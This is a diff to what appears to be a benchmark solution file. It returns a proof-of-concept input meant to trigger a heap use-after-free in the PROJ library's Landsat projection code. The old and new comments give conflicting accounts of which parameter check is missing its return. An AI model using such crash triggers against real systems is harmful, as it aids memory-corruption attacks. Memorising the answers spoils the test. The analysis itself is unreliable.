@@ -1,9 +1,13 @@
+import sys
+
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # The vulnerability in PJ_lsat.c (issue #3225, fix PR #3630) is a Heap Use-After-Free.
-        # It occurs because a return statement is missing after destr(P) when the 'path' parameter is invalid.
+        # The vulnerability is a Heap Use-After-Free in PJ_lsat.c.
+        # It occurs when the 'lsat' parameter check fails (missing return), causing the code 
+        # to fall through, eventually returning a freed pointer which is then freed again by pj_init.
         # To trigger it, we need:
-        # 1. A valid 'lsat' parameter (1-5) to pass the first check.
-        # 2. An invalid 'path' parameter (<=0 or >limit) to trigger the second (vulnerable) check.
-        # This causes destr(P) to free P, but execution continues, leading to UAF.
-        return b"+proj=lsat +lsat=1 +path=0"
+        # 1. 'lsat' projection (+proj=lsat)
+        # 2. Invalid 'lsat' value (<=0 or >5). Omitting it defaults to 0, which is invalid.
+        # 3. Valid 'path' value to ensure we pass the 'path' check if it occurs before the 'lsat' check.
+        #    Landsat paths are 1-based integers. +path=1 is valid.
+        return b"+proj=lsat +path=1"
